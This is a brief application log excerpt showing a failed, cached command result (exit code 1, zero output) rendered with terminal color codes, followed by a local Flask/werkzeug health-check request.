2025-10-24 06:15:27,386 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 06:15:27,386 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 06:15:27,386 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 06:15:27,386 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 06:15:27,386 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 06:15:28,435 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 06:15:28] "GET /health HTTP/1.1" 200 -
